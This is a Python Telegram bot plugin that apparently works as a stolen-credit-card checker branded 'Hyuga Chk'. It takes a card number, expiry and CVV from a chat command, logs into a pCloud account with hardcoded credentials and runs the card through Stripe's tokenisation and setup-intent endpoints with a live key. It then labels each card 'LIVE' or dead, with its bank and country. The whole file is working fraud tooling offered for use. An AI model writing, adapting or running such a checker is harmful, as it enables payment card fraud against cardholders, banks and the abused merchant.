import json
import requests
import asyncio
import os
import time
from pyrogram import Client, filters
#from configs import Config                         # aqui dice que de configs importe lan classe config
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

@Client.on_message(filters.command("pr", prefixes=["/", "."]))
async def pr(client, message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    ini = time.perf_counter()
    ccs = message.text[len('/pr '):]

    if not ccs:
        await message.reply("/pr cc|mm|aa")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    
    text = await message.reply(f'<b>𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐂𝐜 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭</b> <code>{ccs} </code>🔴')

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Referer': 'https://www.pcloud.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = {
        'username': 'valuedoreddf@gmail.com',
        'password': 'werwrewrw23243432',
        'deviceid': 'jcssi7jtr88j14xyfydhlhsnozwbezezjvss',
        'language': 'en',
        '_t': '1677291090761',
        'logout': '1',
        'getlastsubscription': '1',
        'promoinfo': '1',
        'os': '4',
        'osversion': '0.0.0',}

    response = requests.post('https://api.pcloud.com/login', headers=headers, data=data).json()
    auth = response['auth']

    req1 = await text.edit_text("<b>[■■□□□□□□□□] 20%</b>")

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }
    
    data = f'time_on_page=226329&pasted_fields=number&guid=NA&muid=990d0a1c-44f7-4c4f-a808-1b713812daf8745337&sid=25c3c5c6-9e6d-40c8-9956-1cdb848abf7098fe21&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&payment_user_agent=stripe.js%2F78ef418&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[name]=JUANDDDD&card[cvc]={cvv}'
    
    response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data).json()
    idt = response['id']

    req2 = await req1.edit_text("<b>■■■■□□□□□□] 40%</b>")                
    await text.edit_text("<b>[■■■■■■□□□□] 60%</b>")

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'es-ES',
        'Origin': 'https://www.pcloud.com',
        'Referer': 'https://www.pcloud.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    params = {
        'auth': auth
    }

    response1 = requests.get('https://api.pcloud.com/billing/stripe/setupintent', params=params, headers=headers).json()
    clientsecret = response1['clientsecret']
    seti = clientsecret.split('_secret_')[0]

    req3 = await req2.edit_text("<b>[■■■■■■■■□□] 80%</b>")
    await text.edit_text("<b>[■■■■■■■■■■] 100%</b>")
    await text.edit_text("<b>⋘ Tʀᴀɴsᴍɪssɪᴏɴ ᴇʀʀᴏʀ. Pʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ. ⋙</b>")

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    }

    data = f'payment_method_data[type]=card&payment_method_data[card][token]={idt}&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=990d0a1c-44f7-4c4f-a808-1b713812daf8745337&payment_method_data[sid]=25c3c5c6-9e6d-40c8-9956-1cdb848abf7098fe21&payment_method_data[payment_user_agent]=stripe.js%2F80b922db8%3B+stripe-js-v3%2F80b922db8&payment_method_data[time_on_page]=232374&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret={clientsecret}'

    response = requests.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',headers=headers,data=data).json()
    errorcode = response['error']['code']
    errormessge = response['error']['message']

    inputm = message.text.split(None, 1)[1]
    bincode = 6
    BIN =  inputm[:bincode]
    req = requests.get(f"https://bin-api-dragon.ga/bin/api/{BIN}").json()
   
    data = req["data"]
    vendor = data["vendor"]
    type = data["type"]
    level = data["level"]
    country = data["country"]
    bank = data["bank"]
    countryInfo = data["countryInfo"]
    name = countryInfo["name"]
    code = countryInfo["code"]
    emoji = countryInfo["emoji"]

    if 'incorrect_cvc' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙻𝙸𝚅𝙴 ✅
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
""")
    elif 'Your card has insufficient funds.' in errormessge:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙲𝙽𝙽 𝙸𝙽𝚂𝚄𝙵𝙸𝙲𝙸𝙴𝙽𝚃𝙴𝚂 𝙵𝙾𝙽𝙳𝙾𝚂 ✅
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
""")
        
    elif 'card_declined' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙽𝙾 𝙲𝙾𝙼𝙿𝚁𝙾𝙱𝙰𝙳𝙾 ❌
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍:<code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>
•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
""")
    elif 'incorrect_number' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙼𝚄𝙴𝚁𝚃𝙰 ❌
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
""")
    elif 'expired_card' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙼𝚄𝙴𝚁𝚃𝙰 ❌
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>""")
    
    elif 'invalid_cvc' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙼𝚄𝙴𝚁𝚃𝙰 ❌
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
        """)
    elif 'An error occurred while processing your card.' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ      
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙼𝚄𝙴𝚁𝚃𝙰 ❌
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
        """) 
    
    elif 'An error occurred while processing your card.' in errorcode:
        await req3.edit_text(f"""
Ｈｙｕｇａ Ｃｈｋ
═════ ❅ 𝙲𝚊𝚛𝚍 𝙸𝚗𝚏𝚘 ❅ ═════
𝚂𝚝𝚊𝚝𝚞𝚜: 𝙼𝚄𝙴𝚁𝚃𝙰 ❌
𝙶𝚊𝚝𝚎 : 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝙽𝙽
𝙲𝚊𝚛𝚍: <code>{ccs}</code>
𝙼𝚎𝚜𝚜𝚊𝚐𝚎: <b>{errormessge}</b>
𝙱𝚒𝚗 𝚃𝚢𝚙𝚎: <code>{vendor}-{type}-{level}</code> 
𝙱𝚊𝚗𝚔: <code>{bank}</code> 
𝙲𝚘𝚞𝚗𝚝𝚛𝚢: <code>{country} [{emoji}]</code>

•─≻ 𝘙𝘦𝘲𝘶𝘦𝘴𝘵𝘦𝘥 𝘉𝘺
𝚄𝚜𝚎𝚛: <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
        """) 
    else:
        await req3.edit_text(response)
